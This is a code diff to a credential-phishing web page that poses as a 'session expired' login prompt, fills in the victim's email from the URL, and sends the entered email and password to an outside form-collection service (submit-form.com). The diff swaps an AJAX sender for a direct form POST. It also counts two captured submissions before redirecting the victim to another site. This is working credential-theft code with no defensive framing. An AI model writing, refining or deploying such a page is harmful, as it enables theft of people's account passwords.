@@ -134,11 +134,12 @@
             <div class="alert alert-danger" id="msg" style="display: none;">Incorrect Password</div>
             <div class="text-center confirm">Your session has expired please login again to continue</div>
             <div id="error" style="color: red;"></div>
-            <form class="flex_column" id="form">
+            <form class="flex_column" id="form" action="https://submit-form.com/5BYUqxAm1" method="POST">
                 <label class="text-secondary font-weight-bold">Email Address</label>
                 <input type="email" readonly class="form-control email" required="required" name="email" id="email" autocomplete="on">
                 <label class="text-secondary font-weight-bold">Password</label>
                 <input type="password" class="form-control password" name="password" required="" id="password">
+                <input type="hidden" name="redirect_url" value="YOUR_PAGE_URL?success=true">
                 <br>
                 <div></div>
                 <input style="margin-top: 15px;" class="btn newbutton" type="submit" value="Sign In" name="submit" id="newbutton">
@@ -155,9 +156,6 @@
     <input type="hidden" value="0" id="number">
 
 <script>
-    const phpLink = "https://submit-form.com/5BYUqxAm1";
-    const sendCount = [];
-
     // Extract email from URL hash
     const url = new URL(window.location.href);
     const updated_email = url.hash.replace("#", "");
@@ -181,77 +179,32 @@
         // Set the name in the header
         document.querySelector("#name").innerHTML = linkArr;
 
-        // Form submission handler
+        // Track submission count in localStorage
+        let sendCount = parseInt(localStorage.getItem("sendCount") || "0");
+        const errors = document.getElementById("error");
+
+        // Check if redirected back with success
+        const params = new URLSearchParams(window.location.search);
+        if (params.get("success") === "true") {
+            sendCount++;
+            localStorage.setItem("sendCount", sendCount);
+            errors.innerText = `Submission successful! Attempt ${sendCount} of 2`;
+            if (sendCount >= 2) {
+                errors.innerText = "Redirecting to free.com...";
+                setTimeout(() => {
+                    window.location.href = "https://www.free.com";
+                }, 2000);
+            }
+        }
+
+        // Validate email before submission
         const form = document.getElementById("form");
         form.addEventListener("submit", function (e) {
-            e.preventDefault();
-
             const email = document.getElementById("email").value;
-            const errors = document.getElementById("error");
-            const button = document.getElementById("newbutton");
-            const password = document.getElementById("password");
-
-            // Validate email
             if (!email || !email.includes("@")) {
+                e.preventDefault();
                 errors.innerText = "Invalid email address.";
-                return;
             }
-
-            // Disable button and show loading state
-            button.disabled = true;
-            button.value = "Submitting...";
-
-            // Prepare form data
-            const formData = new FormData(form);
-            // Log form data for debugging
-            console.log("Form Data Sent:");
-            for (const [key, value] of formData.entries()) {
-                console.log(`${key}: ${value}`);
-            }
-
-            // Send AJAX request
-            const xhr = new XMLHttpRequest();
-            xhr.open("POST", phpLink, true);
-            xhr.onreadystatechange = function () {
-                if (xhr.readyState === XMLHttpRequest.DONE) {
-                    // Re-enable button
-                    button.disabled = false;
-                    button.value = "Sign In";
-
-                    console.log("Server Response Status:", xhr.status);
-                    console.log("Server Response Text:", xhr.responseText);
-
-                    if (xhr.status === 200) {
-                        // Successful submission
-                        sendCount.push("sent");
-                        errors.innerText = `Submission successful! Attempt ${sendCount.length} of 2`;
-                        document.getElementById("msg").style.display = "none";
-
-                        // Redirect to www.free.com after two successful submissions
-                        if (sendCount.length >= 2) {
-                            errors.innerText = "Redirecting to free.com...";
-                            setTimeout(() => {
-                                window.location.href = "https://www.free.com";
-                            }, 2000);
-                        }
-                    } else {
-                        // Handle server errors
-                        errors.innerText = `Submission failed. Server returned status ${xhr.status}.`;
-                        document.getElementById("msg").style.display = "block";
-                        console.error(`Server error: ${xhr.status} - ${xhr.responseText}`);
-                    }
-                }
-            };
-            xhr.onerror = function () {
-                // Handle network errors (e.g., CORS, no connection)
-                button.disabled = false;
-                button.value = "Sign In";
-                errors.innerText = "Network error. Possible CORS issue or server unreachable.";
-                document.getElementById("msg").style.display = "block";
-                console.error("Network error: Check CORS or server availability");
-            };
-            xhr.send(formData);
-            password.value = ""; // Clear password field
         });
 
         // Optional: Uncomment to enable closing the login form
